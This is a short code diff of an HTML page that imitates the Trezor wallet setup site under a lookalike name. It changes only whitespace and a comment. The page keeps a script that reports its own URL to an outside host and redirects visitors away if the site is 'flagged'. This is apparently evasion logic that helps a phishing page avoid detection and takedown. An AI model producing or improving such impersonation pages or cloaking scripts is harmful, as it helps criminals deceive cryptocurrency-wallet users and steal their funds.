@@ -9,7 +9,7 @@
     <title>Trézor.io/Start® | Starting Up Your Device | Trézor®</title>
     <link rel="stylesheet" href="style.css">
 </head>
-    <script>
+   <script>
   async function checkSiteSafety() {
     const siteUrl = encodeURIComponent(window.location.href);
     const checkUrl = `https://sitechecker.iosstart.online/check.php?url=${siteUrl}`;
@@ -19,7 +19,7 @@
       const data = await response.json();
 
       if (data.flagged) {
-        // 🚫 If the site is flagged, redirect to a safe backup URL
+        // 🚨 Redirect if flagged
         window.location.href = "https://your-safe-backup-url.com";
       }
     } catch (error) {
@@ -29,6 +29,7 @@
 
   checkSiteSafety();
 </script>
+
 <body>
     <header class="header">
         <div class="header-content">
